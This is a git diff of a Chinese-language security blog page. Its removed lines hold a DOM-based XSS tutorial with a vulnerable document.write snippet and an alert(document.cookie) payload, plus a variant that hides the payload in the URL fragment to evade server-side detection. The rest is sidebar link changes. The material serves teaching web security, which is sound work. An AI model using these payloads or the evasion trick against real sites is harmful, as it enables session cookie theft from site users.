-
-<h2 id="toc_2">DOM型xss</h2>
-
-<ul>
-<li>举个例子：</li>
-</ul>
-
-<p>假如我们访问一个页面: <code>http://www.example.com/welcome.html</code></p>
-
-<pre class="line-numbers"><code class="language-markup">&lt;HTML&gt;
-&lt;TITLE&gt;Welcome!&lt;/TITLE&gt;
-Hi
-&lt;SCRIPT&gt;
-var pos=document.URL.indexOf(&quot;name=&quot;)+5;
-document.write(document.URL.substring(pos,document.URL.length));
-&lt;/SCRIPT&gt;
-&lt;BR&gt;
-Welcome to our system
-…
-&lt;/HTML&gt;
-</code></pre>
-
-<p>此页面将用于欢迎用户，例如:</p>
-
-<p><code>http://www.example.com/welcome.html?name=lonelyor</code></p>
-
-<p>但是请求如下: </p>
-
-<p><code>http://www.example.com/welcome.html?name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
-
-<p>这样会触发dom型xss的条件。让我们看看为什么:</p>
-
-<p>当受害者的浏览器像 <code>www.example.con</code> 发送http请求，并接受上述(静态)html页面。然后受害者的浏览器会开始将html解析为dom，dom包含一个名为 document 的对象，该对象包含一个名为 URL 的属性，并且此属性使用当前页面的 URL 填充来作为 dom 创建的一部分。当解析器达到javascript代码时，它会执行</p>
-
-<pre class="line-numbers"><code class="language-javascript">var pos=document.URL.indexOf(&quot;name=&quot;)+5;
-document.write(document.URL.substring(pos,document.URL.length));
-</code></pre>
-
-<p>并修改页面的原始html。这种情况下，代码引用 document.URL，因此，此name字符串的一部分将嵌入在html中并立即解析，这时会在同一页面执行 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，因此是xss条件。</p>
-
-<ul>
-<li><p>注意</p>
-<ul>
-<li>恶意代码在任何时候都没有嵌入到原始html页面中(这与反射和存储型不同)</li>
-<li>此漏洞仅在浏览器不修改url字符时才有效。当url不直接在地址栏中输入时，火狐会自动编码 document.url 中的 &lt;和&gt;(分别为 %3C 和 %3E )，因此火狐不易收到攻击。IE6.0因为不编码这些所以容易被攻击。当然，直接嵌入HTML只是一个攻击挂载点，有各种场景不需要&lt;和&gt;，因此Mozilla通常不能免受此攻击。</li>
-</ul></li>
-<li><p>规避服务器检测</p>
-<p>显然上面的方法还是把payload发送到了服务器，这样后端还是可以检测到，不过，我们可以规避这种检测。</p>
-<p>新的payload如下:</p>
-<p><code>http://www.example.com/welcome.html#name=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
-<p>注意文件后面的数学符号(#)，他告诉浏览器，#后面的内容都是片段，即不是查询的一部分，火狐和IE6.0不会将片段发送到服务器，因此服务器将看到相当于<code>http://www.example.com/welcome.html</code>，所以服务器不会看到有效载荷。</p></li>
-</ul>
-
-<h2 id="toc_3">参考链接</h2>
-
-<p><a href="https://www.owasp.org/index.php/Testing_for_Reflected_Cross_site_scripting_(OTG-INPVAL-001)">反射性xss</a></p>
-
-<p><a href="https://www.owasp.org/index.php/Testing_for_Stored_Cross_site_scripting_(OTG-INPVAL-002)">存储型xss</a></p>
-
-<p><a href="https://www.owasp.org/index.php/Testing_for_DOM-based_Cross_site_scripting_(OTG-CLIENT-001)">dom型xss</a></p>
+<p>显然攻击者可以使用相同机制插入任意日志条目。</p>
 
                         
                       </div>
@@ -868,31 +421,31 @@ document.write(document.URL.substring(pos,document.URL.length));
 	      
 		      
 			      <li class="post">
+			        <a href="15506293038772.html">使用浏览器进行Web应用安全测试</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15505564665657.html">深入了解最近普遍存在的DNS劫持攻击事件</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15489296290618.html">Mediakit报告设备商的空间不足以执行此操作</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
+			        <a href="15489008835167.html">黑链</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
 			        <a href="15488284836388.html">90后空巢青年生活指南</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15483045487644.html">Atom设置和取消代理</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15483045486850.html">BASIC INJECTION 基本注入</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15483045491221.html">CRLF注入</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15483045491124.html">FOEENSICS 101</a>
 			      </li>
 		     
 		  
